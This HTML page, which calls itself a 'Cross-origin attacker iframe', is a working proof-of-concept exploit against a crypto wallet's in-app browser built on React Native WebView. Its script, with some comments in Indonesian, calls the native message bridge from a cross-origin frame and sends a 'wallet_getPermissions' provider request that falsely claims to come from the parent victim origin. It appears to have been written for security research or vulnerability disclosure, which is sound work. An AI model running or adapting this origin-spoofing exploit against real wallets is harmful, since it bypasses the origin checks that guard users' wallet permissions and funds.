<!doctype html>
<meta charset="utf-8">

Cross-origin attacker iframe.

<pre id="status"></pre>

<script>
const status =
  document.getElementById('status');

const params =
  new URLSearchParams(location.search);

const victimOrigin =
  params.get('victimOrigin');


function show(s) {
  status.textContent += s + '\n';
}


function sendParent(data) {
  parent.postMessage(
    data,
    victimOrigin
  );
}


try {

  if (
    !victimOrigin ||
    new URL(victimOrigin).origin !== victimOrigin
  ) {
    throw new Error(
      'Invalid victimOrigin: ' + victimOrigin
    );
  }


  const bridge =
    window.webkit?.messageHandlers
      ?.ReactNativeWebView;


  show(
    'Origin B: ' +
    location.origin
  );

  show(
    'victimOrigin: ' +
    victimOrigin
  );

  show(
    'bridgeVisible: ' +
    Boolean(bridge?.postMessage)
  );


  addEventListener('message', event => {

    if (event.source !== parent)
      return;

    if (event.origin !== victimOrigin)
      return;


    if (
      event.data?.type !==
      'GET_PERMISSIONS_AS_A'
    ) {
      return;
    }


    /*
     * ACK FIRST.
     *
     * Kalau parent tidak menerima ini,
     * masalahnya masih postMessage,
     * bukan Core.
     */
    sendParent({
      type: 'TRIGGER_RECEIVED'
    });


    try {

      if (!bridge?.postMessage) {

        throw new Error(
          'ReactNativeWebView WKScriptMessageHandler unavailable'
        );
      }


      const id =
        event.data.id;


      const wrapper =
        JSON.stringify({

          method:
            'provider_request',

          payload:
            JSON.stringify({

              id,

              /*
               * REAL SENDER = B
               * CLAIMED     = A
               */
              origin:
                victimOrigin,

              request: {
                method:
                  'wallet_getPermissions',

                params: []
              }

            })

        });


      bridge.postMessage(wrapper);


      sendParent({
        type: 'REQUEST_SENT',
        id
      });


    } catch (e) {

      sendParent({
        type: 'CHILD_ERROR',

        message:
          String(e?.message || e)
      });
    }

  });


  sendParent({

    type:
      'READY',

    victimOrigin,

    bridgeVisible:
      Boolean(bridge?.postMessage)

  });


} catch (e) {

  status.textContent =
    String(e?.message || e);
}
</script>
